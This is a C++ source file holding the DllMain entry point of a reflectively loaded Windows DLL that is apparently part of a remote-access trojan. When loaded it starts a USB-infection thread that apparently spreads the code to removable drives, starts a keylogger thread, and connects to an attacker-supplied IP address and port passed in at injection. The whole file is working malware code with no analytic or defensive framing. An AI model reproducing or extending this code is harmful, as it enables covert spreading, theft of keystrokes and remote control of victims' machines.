#include "ReflectiveLoader.h"
#include "Probe.h"

//===============================================================================================//


extern HINSTANCE hAppInstance;
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	const char* ip;
	int Port;
	HANDLE ht;
	HANDLE kt;
	char* cpCommandLine = (char*)lpReserved; // ip address and port
	char* srvinfo[3];
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:

		hAppInstance = hinstDLL;


		ht = CreateThread(NULL, 0, System::USBINFECT, NULL, 0, NULL);  // Create Usb Infection thread
		if (ht == NULL)
		{
			//exit(1);
		}


		kt = CreateThread(NULL, 0, System::KEYLOG_THREAD, NULL, 0, NULL);  // Create Usb Infection thread
		if (kt == NULL)
		{
			//exit(1);
		}

		System::split(cpCommandLine, srvinfo, ":");
		ip = srvinfo[0];
		Port = atoi(srvinfo[1]);

		Server::ProbeConnect(ip, Port);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}